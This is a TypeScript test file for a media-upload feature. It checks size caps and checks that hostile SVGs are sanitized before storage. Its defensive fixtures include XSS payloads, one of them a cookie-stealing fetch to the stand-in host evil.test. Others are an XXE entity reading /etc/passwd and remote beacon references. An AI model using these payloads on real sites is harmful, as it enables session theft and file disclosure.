/**
 * T1 — signed-upload size caps, and T3 — sanitize-on-register SVG.
 *
 * T1 background: /api/admin/media/upload/init minted signed URLs with no
 * size check at all, and /api/admin/media/upload/register only validated
 * `kind === "image"`. The bucket ceiling is 200 MB, so a 200 MB "document"
 * sailed through while migration 20261103000000 claimed 25 MB was
 * enforced. These tests pin the caps AND pin that register measures the
 * real stored bytes rather than believing the client's declared size.
 *
 * T3 background: SVGs were dropped from every library read because there
 * was no safe way to store one. Now they ride a text route that sanitizes
 * before writing, and `resolveAssetKind` only classifies an SVG as an
 * image when the row carries the sanitizer's stamp.
 */

import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import path from "node:path";
import { describe, it } from "node:test";
import type { SupabaseClient } from "@supabase/supabase-js";

import { listTenantMediaLibrary } from "./assets";
import {
  MEDIA_DOCUMENT_MAX_BYTES,
  MEDIA_IMAGE_MAX_BYTES,
  MEDIA_VIDEO_MAX_BYTES,
  SVG_SANITIZED_METADATA_KEY,
  maxBytesForMediaKind,
  validateMediaUploadSize,
} from "./validation";
import { sanitizeSvgLogoBuffer } from "../sanitize-svg-upload";

// ── T1 · cap boundaries ────────────────────────────────────────────────

describe("T1 media upload size caps", () => {
  it("documents the caps migration 20261103000000 claims are enforced", () => {
    assert.equal(MEDIA_IMAGE_MAX_BYTES, 8 * 1024 * 1024);
    assert.equal(MEDIA_DOCUMENT_MAX_BYTES, 25 * 1024 * 1024);
    assert.equal(MEDIA_VIDEO_MAX_BYTES, 200 * 1024 * 1024);
    assert.equal(maxBytesForMediaKind("image"), MEDIA_IMAGE_MAX_BYTES);
    assert.equal(maxBytesForMediaKind("document"), MEDIA_DOCUMENT_MAX_BYTES);
    assert.equal(maxBytesForMediaKind("video"), MEDIA_VIDEO_MAX_BYTES);
  });

  it("accepts a file exactly AT the cap for every kind", () => {
    for (const kind of ["image", "document", "video"] as const) {
      const at = validateMediaUploadSize({
        kind,
        byteSize: maxBytesForMediaKind(kind),
      });
      assert.equal(at.ok, true, `${kind} at cap should pass`);
    }
  });

  it("rejects one byte OVER the cap for every kind, with 413", () => {
    for (const kind of ["image", "document", "video"] as const) {
      const over = validateMediaUploadSize({
        kind,
        byteSize: maxBytesForMediaKind(kind) + 1,
      });
      assert.equal(over.ok, false, `${kind} over cap must fail`);
      if (!over.ok) {
        assert.equal(over.status, 413);
        assert.match(over.error, /limit/);
      }
    }
  });

  it("rejects empty / non-finite sizes with 400", () => {
    for (const byteSize of [0, -1, Number.NaN, Number.POSITIVE_INFINITY]) {
      const res = validateMediaUploadSize({ kind: "image", byteSize });
      assert.equal(res.ok, false);
      if (!res.ok) assert.equal(res.status, 400);
    }
  });

  it("a 200 MB document is refused even though the bucket allows 200 MB", () => {
    // The exact regression: the bucket ceiling was the only real gate.
    const res = validateMediaUploadSize({
      kind: "document",
      byteSize: 200 * 1024 * 1024,
    });
    assert.equal(res.ok, false);
    if (!res.ok) assert.equal(res.status, 413);
  });
});

// ── T1 · register must not believe the declared size ───────────────────

const REPO_WEB_ROOT = path.resolve(__dirname, "../../../..");

function readSource(relative: string): string {
  return readFileSync(path.join(REPO_WEB_ROOT, relative), "utf8");
}

describe("T1 register-time enforcement uses the REAL stored size", () => {
  const registerSrc = readSource(
    "src/app/api/admin/media/upload/register/route.ts",
  );
  const initSrc = readSource("src/app/api/admin/media/upload/init/route.ts");

  it("init gates on the client-declared byteSize before minting a URL", () => {
    assert.match(initSrc, /validateMediaUploadSize/);
    // The check must run before createSignedUploadUrl, or the URL is
    // already usable by the time we say no.
    assert.ok(
      initSrc.indexOf("validateMediaUploadSize") <
        initSrc.indexOf("createSignedUploadUrl"),
      "size gate must precede createSignedUploadUrl",
    );
  });

  it("register validates storedSize (measured from storage), not body.byteSize", () => {
    assert.match(
      registerSrc,
      /validateMediaUploadSize\(\{\s*kind,\s*byteSize:\s*storedSize\s*\}\)/,
      "register must validate the size it measured from storage",
    );
    assert.ok(
      !/body\.byteSize/.test(registerSrc),
      "register must never read a client-declared size",
    );
    // storedSize comes from the downloaded object's own byteLength.
    assert.match(registerSrc, /storedBuf\.byteLength/);
  });

  it("register deletes the over-cap object instead of orphaning it", () => {
    const gateIdx = registerSrc.indexOf("const sizeCheck =");
    assert.ok(gateIdx > 0);
    const gateBlock = registerSrc.slice(gateIdx, gateIdx + 800);
    assert.match(gateBlock, /storage\.from\(BUCKET\)\.remove\(\[storagePath\]\)/);
  });

  it("register runs the size gate before any media_assets insert", () => {
    assert.ok(
      registerSrc.indexOf("const sizeCheck =") <
        registerSrc.indexOf("insertTenantImageAsset("),
      "size gate must precede the row insert",
    );
  });
});

// ── T3 · hostile SVG fixtures ──────────────────────────────────────────

const HOSTILE_SVGS: Array<{ name: string; svg: string; poison: RegExp }> = [
  {
    name: "inline <script>",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><script>alert(document.domain)</script><rect width="10" height="10"/></svg>`,
    poison: /script/i,
  },
  {
    name: "onload event handler",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" onload="alert(1)"><rect width="10" height="10"/></svg>`,
    poison: /onload/i,
  },
  {
    name: "onclick on a child element",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect width="10" height="10" onclick="fetch('//evil.test?c='+document.cookie)"/></svg>`,
    poison: /onclick/i,
  },
  {
    name: "foreignObject with embedded HTML",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><foreignObject width="10" height="10"><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="javascript:alert(1)"></iframe></body></foreignObject></svg>`,
    poison: /foreignObject|iframe/i,
  },
  {
    name: "javascript: href on an anchor",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><a href="javascript:alert(1)"><rect width="10" height="10"/></a></svg>`,
    poison: /javascript:/i,
  },
  {
    name: "external image reference (data exfil beacon)",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><image href="https://evil.test/beacon.png" width="10" height="10"/></svg>`,
    poison: /evil\.test/i,
  },
  {
    name: "XXE doctype",
    svg: `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><text>&xxe;</text></svg>`,
    poison: /ENTITY|etc\/passwd/i,
  },
  {
    name: "<use> pulling a remote fragment",
    svg: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><use href="https://evil.test/x.svg#a"/></svg>`,
    poison: /evil\.test/i,
  },
];

describe("T3 hostile SVG is neutralized before anything reaches storage", () => {
  for (const fixture of HOSTILE_SVGS) {
    it(`neutralizes: ${fixture.name}`, () => {
      const result = sanitizeSvgLogoBuffer(fixture.svg);
      if (!result.ok) {
        // Outright rejection is the strongest possible outcome.
        assert.match(result.error, /SVG rejected/);
        return;
      }
      // If it was accepted, the hostile construct must be GONE from the
      // bytes we would have written. The sanitizer returns rewritten
      // markup, never the original, so this is the servable payload.
      const out = result.bytes.toString("utf8");
      assert.ok(
        !fixture.poison.test(out),
        `sanitized output still contains ${fixture.poison} — got: ${out}`,
      );
    });
  }

  it("a benign SVG survives and comes back as real markup", () => {
    const result = sanitizeSvgLogoBuffer(
      `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M2 2h20v20H2z" fill="#101010"/></svg>`,
    );
    assert.equal(result.ok, true);
    if (result.ok) {
      const out = result.bytes.toString("utf8");
      assert.match(out, /<svg/);
      assert.match(out, /<path/);
    }
  });

  it("the SVG route sanitizes BEFORE it uploads, and stores only sanitized bytes", () => {
    const svgRouteSrc = readSource("src/app/api/admin/media/upload/svg/route.ts");
    assert.ok(
      svgRouteSrc.indexOf("sanitizeSvgLogoBuffer(") <
        svgRouteSrc.indexOf(".upload("),
      "sanitize must precede the storage write",
    );
    assert.match(svgRouteSrc, /\.upload\(storagePath,\s*sanitized\.bytes/);
    // The rejection path must not write anything.
    assert.match(svgRouteSrc, /if \(!sanitized\.ok\)/);
  });

  it("SVG never rides the signed-PUT lane (no unsanitized bytes in the public bucket)", () => {
    const initSrc = readSource("src/app/api/admin/media/upload/init/route.ts");
    assert.ok(
      !/svg/i.test(initSrc),
      "upload/init must not mint signed URLs for svg",
    );
  });
});

// ── T3 · library classification is gated on the sanitizer stamp ────────

type FakeRow = Record<string, unknown>;

class FakeQuery {
  private filters: Array<(row: FakeRow) => boolean> = [];
  constructor(private rows: FakeRow[]) {}
  select() {
    return this;
  }
  eq(field: string, value: unknown) {
    this.filters.push((r) => r[field] === value);
    return this;
  }
  is(field: string, value: unknown) {
    this.filters.push((r) => r[field] === value);
    return this;
  }
  in(field: string, values: unknown[]) {
    this.filters.push((r) => values.includes(r[field]));
    return this;
  }
  order() {
    return this;
  }
  limit() {
    return this;
  }
  then(
    resolve: (v: { data: FakeRow[]; error: null }) => unknown,
    reject?: (r: unknown) => unknown,
  ) {
    const rows = this.filters.reduce((cur, f) => cur.filter(f), this.rows);
    return Promise.resolve({ data: rows, error: null }).then(resolve, reject);
  }
}

function fakeSupabase(rows: FakeRow[]): SupabaseClient {
  return {
    from(table: string) {
      if (table === "media_assets") return new FakeQuery(rows);
      return new FakeQuery([]);
    },
    storage: {
      from(bucket: string) {
        return {
          getPublicUrl(p: string) {
            return { data: { publicUrl: `https://cdn.test/${bucket}/${p}` } };
          },
        };
      },
    },
  } as unknown as SupabaseClient;
}

function svgRow(overrides: Partial<FakeRow>): FakeRow {
  return {
    id: "svg-row",
    tenant_id: "tenant-a",
    owner_talent_profile_id: null,
    variant_kind: "original",
    storage_path: "tenant/tenant-a/library/mark.svg",
    bucket_id: "media-public",
    public_url: null,
    width: null,
    height: null,
    file_size: 900,
    file_size_bytes: 900,
    byte_size: 900,
    mime: "image/svg+xml",
    mime_type: "image/svg+xml",
    alt: null,
    asset_kind: null,
    tags: [],
    created_at: "2026-08-16T00:00:00.000Z",
    metadata: {},
    purpose: "cms",
    approval_state: "approved",
    deleted_at: null,
    ...overrides,
  };
}

describe("T3 only sanitizer-stamped SVGs enter the library", () => {
  it("a stamped SVG row reads back as an image", async () => {
    const items = await listTenantMediaLibrary(
      fakeSupabase([
        svgRow({
          id: "clean",
          metadata: { [SVG_SANITIZED_METADATA_KEY]: true },
        }),
      ]),
      "tenant-a",
    );
    assert.deepEqual(items.map((i) => i.id), ["clean"]);
    assert.equal(items[0]?.assetKind, "image");
  });

  it("an unstamped legacy SVG row is still dropped", async () => {
    const items = await listTenantMediaLibrary(
      fakeSupabase([svgRow({ id: "legacy", metadata: { source: "seed" } })]),
      "tenant-a",
    );
    assert.deepEqual(items, []);
  });

  it("asset_kind='image' does NOT override the stamp requirement", async () => {
    // A future writer setting asset_kind must not be able to re-open the
    // hole: the SVG branch runs before the persisted-kind branch.
    const items = await listTenantMediaLibrary(
      fakeSupabase([
        svgRow({ id: "forged", asset_kind: "image", metadata: {} }),
      ]),
      "tenant-a",
    );
    assert.deepEqual(items, []);
  });

  it("a .svg path with no MIME at all is dropped unless stamped", async () => {
    const items = await listTenantMediaLibrary(
      fakeSupabase([
        svgRow({ id: "no-mime", mime: null, mime_type: null, metadata: {} }),
      ]),
      "tenant-a",
    );
    assert.deepEqual(items, []);
  });
});
